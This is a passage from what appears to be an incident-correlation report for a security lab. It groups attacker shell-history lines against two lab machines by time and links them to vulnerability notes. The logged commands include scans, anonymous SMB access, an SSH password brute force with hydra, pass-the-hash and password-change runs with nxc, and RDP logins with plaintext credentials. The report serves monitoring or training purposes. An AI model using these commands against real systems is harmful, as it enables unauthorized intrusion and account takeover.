  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 74 - 2026-01-26T19:30:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:30:48 | logs/10.100.7.14/shell_history.csv#L247 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-26T19:30:30 | logs/10.100.7.24/shell_history.csv#L167 | nmap -sV -p- -T3 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 75 - 2026-01-27T18:54:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:54:21 | logs/10.100.7.24/shell_history.csv#L239 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T18:54:36 | logs/10.100.7.12/shell_history.csv#L40 | nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr -M change-password -o NEWPASS=RandomTextPlease
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 76 - 2026-01-27T18:57:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:57:44 | logs/10.100.7.14/shell_history.csv#L299 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:57:13 | logs/10.100.7.22/shell_history.csv#L180 | scp hey.txt ember@10.100.7.46:/home/user
  - 2026-01-27T18:57:52 | logs/10.100.7.24/shell_history.csv#L244 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 77 - 2026-01-27T18:58:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:58:00 | logs/10.100.7.14/shell_history.csv#L300 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:29 | logs/10.100.7.14/shell_history.csv#L301 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:43 | logs/10.100.7.14/shell_history.csv#L302 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:53 | logs/10.100.7.14/shell_history.csv#L303 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:58:12 | logs/10.100.7.24/shell_history.csv#L245 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:39 | logs/10.100.7.24/shell_history.csv#L246 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:48 | logs/10.100.7.24/shell_history.csv#L247 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:58:59 | logs/10.100.7.24/shell_history.csv#L248 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 78 - 2026-01-12T19:32:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:32:56 | logs/10.100.7.13/shell_history.csv#L30 | nmap -sV -p 1-65535 -T3 10.100.7.42
  - 2026-01-12T19:32:19 | logs/10.100.7.22/shell_history.csv#L37 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:$HEX[330a]
  - 2026-01-12T19:32:41 | logs/10.100.7.22/shell_history.csv#L38 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:abc123
  - 2026-01-12T19:32:45 | logs/10.100.7.22/shell_history.csv#L39 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwert
  - 2026-01-12T19:32:48 | logs/10.100.7.22/shell_history.csv#L40 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:qwerty
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 79 - 2026-01-12T19:48:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:48:47 | logs/10.100.7.13/shell_history.csv#L33 | hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42
  - 2026-01-12T19:48:42 | logs/10.100.7.22/shell_history.csv#L42 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 80 - 2026-01-26T19:33:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:33:06 | logs/10.100.7.24/shell_history.csv#L172 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:33:10 | logs/10.100.7.24/shell_history.csv#L173 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:33:27 | logs/10.100.7.24/shell_history.csv#L174 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-26T19:33:59 | logs/10.100.7.31/shell_history.csv#L18 | nxc smb 10.100.7.46 -u ember -p passwrod
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 81 - 2026-01-26T19:42:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:42:39 | logs/10.100.7.24/shell_history.csv#L195 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:42:01 | logs/10.100.7.31/shell_history.csv#L25 | enum4linux -a -u ember -p password 10.100.7.46
  - 2026-01-26T19:42:20 | logs/10.100.7.31/shell_history.csv#L26 | enum4linux -a -u Adminsitrator -p password 10.100.7.46
  - 2026-01-26T19:42:37 | logs/10.100.7.31/shell_history.csv#L28 | enum4linux -a -u Adminsitrator -p password 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 82 - 2026-01-27T20:28:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:28:23 | logs/10.100.7.13/shell_history.csv#L248 | ftp ember 10.100.7.46
  - 2026-01-27T20:28:26 | logs/10.100.7.24/shell_history.csv#L298 | nxc smb 10.100.7.46 -u Administrator -p 781a57928a384400acf7976192ea685a
  - 2026-01-27T20:28:37 | logs/10.100.7.24/shell_history.csv#L299 | nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a
  - 2026-01-27T20:28:58 | logs/10.100.7.24/shell_history.csv#L300 | nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

